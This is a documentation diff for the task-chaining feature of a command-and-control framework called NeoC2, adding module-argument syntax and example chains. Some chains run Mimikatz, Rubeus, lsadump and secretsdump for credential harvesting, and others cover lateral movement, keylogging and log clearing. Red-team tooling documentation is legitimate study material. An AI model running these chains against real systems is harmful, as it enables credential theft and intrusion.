@@ -20,25 +20,42 @@ All task orchestration commands follow the format: `taskchain <action> [options]
 Creates a new task chain with specified modules and options.
 
 ```
-taskchain create <agent_id> <module1,module2,module3> [name=chain_name] [execute=true]
+taskchain create <agent_id> <module1=arg1,arg2,module2=arg3,module3> [name=chain_name] [execute=true]
 ```
 
 **Parameters:**
 - `agent_id`: The target agent ID to execute the chain on
-- `module1,module2,module3`: Comma-separated list of module names to include in the chain
+- `<module1=arg1,arg2,module2=arg3,module3>`: Enhanced format with module-specific arguments
 - `name=chain_name`: (Optional) Name for the task chain
 - `execute=true`: (Optional) Execute the chain immediately after creation (default: false)
 
+**Syntax:**
+The syntax allows specifying arguments for each module directly in the command:
+- `module_name=arg1,arg2` executes the same module multiple times with different arguments
+- `module1=arg1,module2=arg2` executes different modules with their respective arguments
+- Arguments containing commas, parentheses, or quotes are properly handled within the syntax
+- You can mix module types (with and without arguments) in the same command
+
+**Enhanced Syntax Features:**
+- **Multi-argument module execution**: Execute the same module with multiple different arguments in sequence
+- **Module-specific arguments**: Pass specific file paths, scripts, or parameters to each module type
+- **Intelligent comma handling**: Commas within parentheses, brackets, or quotes are preserved correctly
+- **Full module compatibility**: Works with all NeoC2 modules including execute-bof, pwsh, execute-assembly, and custom modules
+
 **Examples:**
 ```bash
-# Create a chain without executing immediately
-taskchain create AGENT001 get_system,whoami,pslist name=priv_escalation
+# Enhanced format - Execute multiple BOF files with execute-bof module
+taskchain create AGENT001 execute-bof=whoami.x64.o,tasklist.x64.o,pwsh=Get-ComputerName.ps1,execute-assembly=rubeus.exe name=test
 
-# Create and immediately execute a chain
-taskchain create AGENT001 recon_enum,net_scan execute=true
+# Enhanced format with PowerShell and assembly execution
+taskchain create AGENT001 pwsh=Invoke-Mimikatz.ps1,execute-assembly=SharpHound.exe name=test
 
-# Simple chain creation
-taskchain create AGENT001 keylog,screen_capture name=data_collection
+# Create and immediately execute a chain using enhanced syntax
+taskchain create AGENT001 peinject=netview.exe,execute-assembly=Seatbelt.exe execute=true
+
+# Mixed format - combining modules with and without arguments
+taskchain create AGENT001 execute-bof=whoami.o,get_system,whoami,execute-assembly=rubeus.exe name=mixed_chain
+
 ```
 
 ### 2. List Task Chains
@@ -142,7 +159,7 @@ When a task chain is executed, it follows this execution flow:
 
 ## Module Compatibility
 
-Task chains work with any NeoC2 module that follows the standard module interface. Common use cases include:
+Task chains work with any NeoC2 module that follows the standard module interface. Common use cases:
 
 ### Reconnaissance Chains
 ```bash
@@ -201,19 +218,46 @@ taskchain create AGENT001 clear_logs,kill_processes,cleanup_files name=cleanup
 
 ### 1. Automated Penetration Test
 ```bash
-# Create an automated penetration test sequence
+# Create an automated penetration test sequence (legacy format)
 taskchain create AGENT001 sysinfo,whoami,priv_enum,get_system,whoami,pslist name=auto_pen_test execute=true
+
+# Enhanced format for more complex operations
+taskchain create AGENT001 execute-bof=whoami.o,priv_enum.o,get_system,whoami,pslist name=enhanced_pen_test execute=true
 ```
 
-### 2. Incident Response
+### 2. Beacon Object File Execution (BOFs)
+```bash
+# Execute multiple BOF files in sequence
+taskchain create AGENT001 execute-bof=whoami.x64.o,tasklist.x64.o,seatbelt.x64.o,pwsh=Get-ComputerName.ps1,execute-assembly=rubeus.exe name=bof_chain
+
+# Multi-step enumeration with BOFs
+taskchain create AGENT001 execute-bof=netview.x64.o,netsession.x64.o,execute-assembly=SharpHound.exe name=enum_chain
+```
+
+### 3. Incident Response
 ```bash
 # Quick incident response data collection
 taskchain create AGENT001 processes,network_connections,log_analysis,file_hashes name=incident_response
 taskchain execute CHAIN1234567890
+
+# Enhanced incident response with file collection
+taskchain create AGENT001 execute-bof=netstat.o,pslist.o,pwsh=Get-EventLogs.ps1,execute-assembly=Seatbelt.exe name=enhanced_incident_response
 ```
 
-### 3. Persistent Monitoring
+### 4. Persistent Monitoring
 ```bash
 # Regular monitoring chain
 taskchain create AGENT001 sysinfo,service_check,process_monitor name=persistent_monitoring
+
+# Enhanced monitoring with multiple checks
+taskchain create AGENT001 execute-bof=service_enum.o,process_check.o,execute-assembly=SharpHound.exe name=enhanced_monitoring
+```
+
+### 5. Post-Exploitation
+```bash
+# Credential harvesting chain
+taskchain create AGENT001 execute-bof=lsadump.o,secretsdump.o,execute-assembly=Rubeus.exe,pwsh=Invoke-Mimikatz.ps1 name=credential_harvest
+
+# Lateral movement preparation
+taskchain create AGENT001 execute-bof=netview.o,shares.o,execute-assembly=SharpHound.exe name=lateral_movement_prep
 ```
